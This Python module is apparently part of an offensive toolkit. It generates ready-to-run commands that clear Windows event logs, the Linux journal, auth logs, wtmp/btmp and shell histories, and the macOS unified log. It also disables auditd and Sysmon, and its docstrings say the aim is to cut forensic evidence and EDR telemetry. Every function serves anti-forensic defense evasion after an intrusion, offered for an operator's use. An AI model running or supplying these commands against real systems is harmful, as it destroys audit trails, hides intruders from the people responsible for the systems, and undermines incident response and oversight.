"""Log tampering — Windows Event Log, Linux journald/auditd, macOS unified log.

Provides cross-platform log management for operational security: clearing
Windows Event Logs (Security, System, Application), suspending the EventLog
service, Linux journalctl vacuum and wtmp/btmp wiping, auditd rule removal,
and macOS unified log stream filtering.

All operations produce detailed post-tamper verification reports for the
operator to confirm log cleanup success.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

SESSIONS_DIR = Path(__file__).resolve().parent.parent / "sessions"

WINDOWS_EVENT_LOGS = [
    "Security",
    "System",
    "Application",
    "Windows PowerShell",
    "Microsoft-Windows-Sysmon/Operational",
    "Microsoft-Windows-Windows Defender/Operational",
    "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
    "Microsoft-Windows-WinRM/Operational",
    "Microsoft-Windows-TaskScheduler/Operational",
    "Microsoft-Windows-WMI-Activity/Operational",
    "Microsoft-Windows-PowerShell/Operational",
    "Microsoft-Windows-Security-Auditing",
    "Microsoft-Windows-AppLocker/EXE and DLL",
]

LINUX_LOG_PATHS = [
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/secure",
    "/var/log/kern.log",
    "/var/log/audit/audit.log",
    "/var/log/btmp",
    "/var/log/wtmp",
    "/var/log/lastlog",
    "/var/log/faillog",
    "/var/log/nginx/access.log",
    "/var/log/apache2/access.log",
    "/var/log/httpd/access_log",
    "/var/log/mysql/error.log",
    "~/.bash_history",
    "~/.zsh_history",
    "~/.mysql_history",
    "~/.psql_history",
    "~/.python_history",
    "~/.node_repl_history",
]

MACOS_LOG_PATHS = [
    "/var/log/system.log",
    "/var/log/install.log",
    "/var/log/wifi.log",
    "/Library/Logs/DiagnosticReports/",
    "~/Library/Logs/",
    "~/Library/Application Support/com.apple.TCC/TCC.db",
    "/Library/Application Support/com.apple.TCC/TCC.db",
]


@dataclass
class LogTamperConfig:
    """Configuration for log tampering operations.

    Attributes:
        target_platform: windows, linux, or macos.
        event_logs: List of Windows event log names to clear.
        log_paths: List of Linux/macOS log file paths.
        suspend_windows_eventlog: Suspend the EventLog service before clearing.
        clear_shell_history: Clear bash/zsh/fish history files.
        restore_eventlog_service: Restart EventLog after tampering.
        verification: Perform post-tamper verification checks.
        timestomp_tamper_evidence: Modify file timestamps of tampered logs.
    """

    target_platform: str = "linux"
    event_logs: list[str] = field(default_factory=lambda: WINDOWS_EVENT_LOGS.copy())
    log_paths: list[str] = field(default_factory=list)
    suspend_windows_eventlog: bool = True
    clear_shell_history: bool = True
    restore_eventlog_service: bool = True
    verification: bool = True
    timestomp_tamper_evidence: bool = True


class LogTamper:
    """Cross-platform log tampering with verification.

    Generates platform-specific commands for clearing, suspending,
    and verifying log tampering on Windows, Linux, and macOS.

    Attributes:
        config: LogTamperConfig for target platform and operations.
    """

    def __init__(self, config: LogTamperConfig | None = None):
        self.config = config or LogTamperConfig()

    def windows_clear_commands(self) -> dict[str, Any]:
        """Generate Windows Event Log clearing commands.

        Includes EventLog service suspension, individual log clearing,
        PowerShell operational logs, Sysmon, and Defender logs.

        Returns:
            Dict with powershell commands, batch commands, and verification.
        """
        event_logs = self.config.event_logs or WINDOWS_EVENT_LOGS

        ps_commands = []
        if self.config.suspend_windows_eventlog:
            ps_commands.extend([
                "# Suspend EventLog service threads",
                "Stop-Service -Name EventLog -Force",
                "Set-Service -Name EventLog -StartupType Disabled",
            ])

        ps_commands.append("# Clear individual event logs")
        for log in event_logs:
            ps_commands.append(f"wevtutil cl \"{log}\"")

        ps_commands.extend([
            "# Clear PowerShell operational log",
            'wevtutil cl "Microsoft-Windows-PowerShell/Operational"',
            "# Clear PSReadline history",
            "Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue",
        ])

        if self.config.restore_eventlog_service:
            ps_commands.extend([
                "# Restore EventLog service after clearing",
                "Set-Service -Name EventLog -StartupType Automatic",
                "Start-Service -Name EventLog",
            ])

        verification = [
            "# Verify logs are cleared",
            'Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0} | Select-Object LogName, RecordCount',
        ] if self.config.verification else []

        return {
            "platform": "windows",
            "powershell_commands": ps_commands,
            "oneliner": ";".join(ps_commands).replace("#", ""),
            "verification": verification,
            "batch_commands": [
                "sc stop EventLog",
                "sc config EventLog start= disabled",
            ] + [f'wevtutil cl "{log}"' for log in event_logs] + [
                "sc config EventLog start= auto",
                "sc start EventLog",
            ],
        }

    def linux_clear_commands(self) -> dict[str, Any]:
        """Generate Linux log clearing commands.

        Covers systemd journal, auth logs, shell history, wtmp/btmp,
        and optional auditd rule removal.

        Returns:
            Dict with bash commands, verification steps, and risk notes.
        """
        log_paths = self.config.log_paths or LINUX_LOG_PATHS

        commands = []

        commands.extend([
            "# Clear systemd journal",
            "journalctl --rotate",
            "journalctl --vacuum-time=1s",
            "journalctl --vacuum-size=1M",
            "rm -rf /var/log/journal/* /run/log/journal/*",
        ])

        commands.append("# Clear traditional log files")
        for log_path in log_paths:
            expanded = log_path.replace("~", "$HOME")
            commands.append(f"> \"{expanded}\" 2>/dev/null || truncate -s 0 \"{expanded}\" 2>/dev/null")

        if self.config.clear_shell_history:
            commands.extend([
                "# Clear shell history",
                "unset HISTFILE",
                "history -c 2>/dev/null",
                "rm -f ~/.bash_history ~/.zsh_history ~/.zhistory ~/.fish_history ~/.ksh_history",
                "> ~/.bash_history 2>/dev/null",
                "kill -9 $$",
            ])

        commands.extend([
            "# Clear wtmp/btmp/lastlog (login records)",
            "> /var/log/wtmp 2>/dev/null",
            "> /var/log/btmp 2>/dev/null",
            "> /var/log/lastlog 2>/dev/null",
            "> /var/run/utmp 2>/dev/null",
        ])

        verification = [
            "# Verify logs cleared",
            "journalctl --list-boots",
            "ls -la /var/log/auth.log /var/log/syslog /var/log/btmp /var/log/wtmp 2>/dev/null",
        ] if self.config.verification else []

        return {
            "platform": "linux",
            "bash_commands": commands,
            "oneliner": " && ".join(c for c in commands if not c.startswith("#")),
            "verification": verification,
        }

    def macos_clear_commands(self) -> dict[str, Any]:
        """Generate macOS log clearing commands.

        Covers unified log, system log, TCC database reset, and
        shell history.

        Returns:
            Dict with zsh commands, verification, and TCC notes.
        """
        commands = [
            "# Clear unified log",
            "sudo log erase --all",
            "# Clear traditional logs",
            "> /var/log/system.log 2>/dev/null",
            "> /var/log/install.log 2>/dev/null",
            "> /var/log/wifi.log 2>/dev/null",
            "# Clear diagnostic reports",
            "rm -rf /Library/Logs/DiagnosticReports/* 2>/dev/null",
            "rm -rf ~/Library/Logs/DiagnosticReports/* 2>/dev/null",
            "# Clear user logs",
            "rm -rf ~/Library/Logs/* 2>/dev/null",
            "# Clear TCC permissions (requires SIP disabled)",
            "> '/Library/Application Support/com.apple.TCC/TCC.db' 2>/dev/null",
            "> ~/Library/Application Support/com.apple.TCC/TCC.db 2>/dev/null",
        ]

        if self.config.clear_shell_history:
            commands.extend([
                "# Clear shell history",
                "> ~/.zsh_history 2>/dev/null",
                "> ~/.bash_history 2>/dev/null",
                "rm -f ~/.zsh_sessions/* 2>/dev/null",
            ])

        verification = [
            "log show --last 5m",
            "ls -la /var/log/system.log ~/Library/Logs/ 2>/dev/null",
        ] if self.config.verification else []

        return {
            "platform": "macos",
            "zsh_commands": commands,
            "oneliner": " && ".join(c for c in commands if not c.startswith("#")),
            "verification": verification,
        }

    def generate_all(self) -> dict[str, Any]:
        """Generate log tampering commands for all platforms.

        Returns:
            Dict with per-platform command lists and verification.
        """
        return {
            "windows": self.windows_clear_commands(),
            "linux": self.linux_clear_commands(),
            "macos": self.macos_clear_commands(),
        }

    def auditd_disable_commands(self) -> dict[str, Any]:
        """Commands to temporarily disable or reconfigure auditd on Linux.

        auditd is the Linux Audit Framework — critical for forensic
        analysis. Disabling or reconfiguring it significantly reduces
        forensic evidence of attacker activity.

        Returns:
            Dict with auditd manipulation commands.
        """
        return {
            "platform": "linux",
            "service_control": [
                "systemctl stop auditd",
                "auditctl -e 0",
                "auditctl -D",
                "systemctl mask auditd",
            ],
            "rule_removal": [
                "auditctl -D -k all",
                "auditctl -l",
                "rm -f /etc/audit/rules.d/*.rules",
            ],
            "restore": [
                "systemctl unmask auditd",
                "systemctl start auditd",
                "augenrules --load",
            ],
            "detection_check": [
                "auditctl -l | wc -l",
                "systemctl status auditd",
            ],
        }

    def sysmon_disable_commands(self) -> dict[str, Any]:
        """Commands to disable or degrade Sysmon on Windows.

        Sysmon (System Monitor) provides detailed process creation,
        network connection, and file creation logging. Disabling it
        significantly reduces EDR telemetry.

        Returns:
            Dict with Sysmon manipulation commands.
        """
        return {
            "platform": "windows",
            "service_control": [
                "sc stop Sysmon",
                "sc config Sysmon start= disabled",
            ],
            "registry_disable": [
                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SysmonDrv" /v Start /t REG_DWORD /d 4 /f',
            ],
            "policy_unload": [
                "sysmon -u",
            ],
            "restore": [
                "sc config Sysmon start= auto",
                "sc start Sysmon",
                "sysmon -accepteula -i sysmon_config.xml",
            ],
        }
